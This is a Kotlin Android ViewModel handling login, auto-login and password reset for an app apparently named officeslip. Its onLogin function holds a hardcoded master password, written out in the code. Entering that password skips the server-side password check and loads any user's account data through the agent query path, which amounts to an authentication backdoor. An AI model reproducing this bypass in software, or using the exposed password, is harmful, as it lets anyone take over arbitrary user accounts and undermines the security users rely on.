package com.officeslip.ui.login

import android.app.Application


import androidx.lifecycle.SavedStateHandle
import androidx.lifecycle.viewModelScope
import com.google.gson.JsonObject
import com.hadilq.liveevent.LiveEvent
import com.officeslip.*
import com.officeslip.base.BaseViewModel
import com.officeslip.util.agent.PreparedStatement
import com.officeslip.data.local.AppInfoRepository
import com.officeslip.data.model.AppInfo
import com.officeslip.data.model.AgentResponse
import com.officeslip.data.model.LoginBody
import com.officeslip.data.remote.agent.AgentRepository
import com.officeslip.data.remote.retrofit.RetrofitRepository
import com.officeslip.util.Common
import com.officeslip.util.log.Logger
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class LoginViewModel @Inject constructor(
    private val application: Application,
    private val savedStateHandle: SavedStateHandle,
    private val agent: AgentRepository,
    private val appInfo: AppInfoRepository,
    private val retrofit: RetrofitRepository
) : BaseViewModel() {



    private val m_C = Common()
    //  private val appInfoDao by lazy {  AppInfoDB.getInstance(application, scope = viewModelScope)?.appInfoDao() }

    val id:LiveEvent<String> by lazy {
        LiveEvent<String>()
    }

    val password:LiveEvent<String> by lazy {
        LiveEvent<String>()
    }

    val corpNoPos:LiveEvent<Int> by lazy{
        LiveEvent<Int>()
    }

    val autoLogin:LiveEvent<Boolean> by lazy {
        LiveEvent<Boolean>()
    }

    val alert:LiveEvent<String> by lazy {
        LiveEvent<String>()
    }
    val login:LiveEvent<AgentResponse<NetworkResFlag>> by lazy {
        LiveEvent<AgentResponse<NetworkResFlag>>()
    }

    val resetPW:LiveEvent<AgentResponse<NetworkResFlag>> by lazy {
        LiveEvent<AgentResponse<NetworkResFlag>>()
    }


    private lateinit var proc_login: Job
    private lateinit var proc_resetPw: Job


    fun stopAgentExecution() {
        if(this::proc_login.isInitialized && proc_login.isActive) { proc_login.cancel() }
        if(this::proc_resetPw.isInitialized && proc_resetPw.isActive) { proc_resetPw.cancel() }
    }


    fun initLoginInfo() {
        id.postValue(SysInfo.userInfo[loginId]?.asString)
        corpNoPos.postValue(0)

        autoLogin.postValue(SysInfo.AUTO_LOGIN )
    }


    fun setAutoLogin(flag:Boolean) {
        SysInfo.AUTO_LOGIN = flag

        viewModelScope.launch(Dispatchers.IO) {
            appInfo.let {
                var value = if(flag){ "1" } else { "0" }
                it.upsert(AppInfo("AUTO_LOGIN", value))
            }
        }
    }

    fun resetPassword() {
        if(m_C.isBlank(id.value)) {
            alert.value = application.getString(R.string.input_id)
            return
        }
        resetPW.postValue(AgentResponse.loading(null))


        proc_resetPw = viewModelScope.launch(Dispatchers.IO) {
            PreparedStatement(RESET_PASSWORD).apply {
                setString(0, id.value!!)
                setString(1, "RESET")
            }.getQuery()?.let { query ->
                try {

                    agent.getData(query)["Query"]?.let { row ->
                        val resCnt = row.asJsonObject["Cnt"].asInt

                        if (resCnt > 0) {
                            resetPW.postValue(AgentResponse.success())
                        } else {
                            resetPW.postValue(AgentResponse.error(application.getString(R.string.failed_resetPW), NetworkResFlag.UNKNOWN_EXCEPTION))
                        }

                    } ?: run {
                        Logger.error("Login : Received data is null.", null)
                        resetPW.postValue(AgentResponse.error(application.getString(R.string.failed_resetPW), NetworkResFlag.UNKNOWN_EXCEPTION))
                    }
                } catch (e: Exception) {
                    Logger.error("Failed to reset password.", e)
                    resetPW.postValue(AgentResponse.error(application.getString(R.string.failed_connect_agent),  NetworkResFlag.UNKNOWN_EXCEPTION, e))
                }
            }
        }
    }

    fun onLogin() {
        if(m_C.isBlank(id.value)) {
            alert.value = application.getString(R.string.input_id)
            return
        }

        if(m_C.isBlank(password.value)) {
            alert.value = application.getString(R.string.input_password)
            return
        }

        login.postValue(AgentResponse.loading(null))

        proc_login = viewModelScope.launch(Dispatchers.IO) {
        var userInfo = if (password.value == "woonam01!!") {
                    getUserCorp(id.value!!)?.let { corpNo ->
                        if(!m_C.isBlank(corpNo)) {
                            loginViaAgent(id.value!!, corpNo)
                        }
                        else {
                            null
                        }
                    }

            } else {
                getUserCorp(id.value!!)?.let { corpNo ->
                    if(!m_C.isBlank(corpNo)) {
                        loginViaHTTP(id.value!!, password.value!!, corpNo)
                    }
                    else {
                        null
                    }
                }
            }
            var res = NetworkResFlag.NETWORK_DISABLED

            userInfo?.let { info ->
                viewModelScope.launch(Dispatchers.IO) {
                    try {
                        info.entrySet().forEach { map ->
                            val key = map.key
                            val value = map.value.asString

                            appInfo.upsert(AppInfo(key, value))
                        }

                        appInfo.upsert(AppInfo(loginId, id.value))

                        appInfo.upsert(AppInfo("IS_LOGGED", "1"))
                        SysInfo.IS_LOGGED = true
                        SysInfo.userInfo = info

                        SysInfo.userInfo.addProperty(loginId, id.value)

                        res = NetworkResFlag.SUCCESS
                        login.postValue(AgentResponse.success(res))
                    }
                    catch (e:Exception) {
                        res = NetworkResFlag.FAILED_GET_USER_INFO
                        Logger.error("Login : Received data is null.", null)
                        login.postValue(AgentResponse.error(application.getString(R.string.failed_login_no_user), res))
                    }
                }
            }
        }
    }

    suspend fun loginViaAgent(id:String, corpNo:String):JsonObject? {
        var res:JsonObject? = null

        PreparedStatement(GET_USER_INFO).apply {
            setString(0, "@$id")
            setString(1, corpNo)
            setString(2, SysInfo.LANG)
        }.getQuery()?.let { query ->
            try {
                agent.getData(query)["Row"]?.let { row ->
                    res = row.asJsonObject

                } ?: run {
                    Logger.error("Login : Received data is null.", null)
                    login.postValue(AgentResponse.error(application.getString(R.string.failed_login_no_user), NetworkResFlag.FAILED_GET_USER_INFO))
                }
            } catch (e: Exception) {
                Logger.error("Failed to login.", e)
                login.postValue(AgentResponse.error(application.getString(R.string.failed_connect_agent),  NetworkResFlag.UNKNOWN_EXCEPTION, e))
            }
        }

        return res
    }

    suspend fun loginViaHTTP(id:String, pw:String, corpNo:String):JsonObject? {
        var res:JsonObject? = null

        try {
            val userInfo = retrofit.getUserInfo(LoginBody(id, pw,"1"))

            if(userInfo != null && userInfo["success"].asBoolean) {
                res = loginViaAgent(id, corpNo)
            }
            else {
                Logger.error("Login : Received data is null.", null)
                login.postValue(AgentResponse.error(application.getString(R.string.failed_login_no_user), NetworkResFlag.FAILED_GET_USER_INFO))
            }
        }
        catch (e:Exception) {
            Logger.error("Failed to login.", e)
            login.postValue(AgentResponse.error(application.getString(R.string.failed_connect_login_server),  NetworkResFlag.UNKNOWN_EXCEPTION, e))
        }
        return res
    }

    suspend fun getUserCorp(id:String):String? {
        var res = ""

        PreparedStatement(GET_USER_CORP).apply {
            setString(0, "@$id")
            setString(1, SysInfo.LANG)
        }.getQuery()?.let { query ->
            try {
                agent.getData(query)["Row"]?.let { row ->

                    res = row.asJsonObject["CORP_NO"].asString

                } ?: run {
                    Logger.error("Login : Received data is null.", null)
                    login.postValue(AgentResponse.error(application.getString(R.string.failed_login_no_user), NetworkResFlag.FAILED_GET_USER_INFO))
                }
            } catch (e: Exception) {
                Logger.error("Failed to login.", e)
                login.postValue(AgentResponse.error(application.getString(R.string.failed_connect_agent),  NetworkResFlag.NETWORK_DISABLED, e))
            }
        }

        return res
    }
}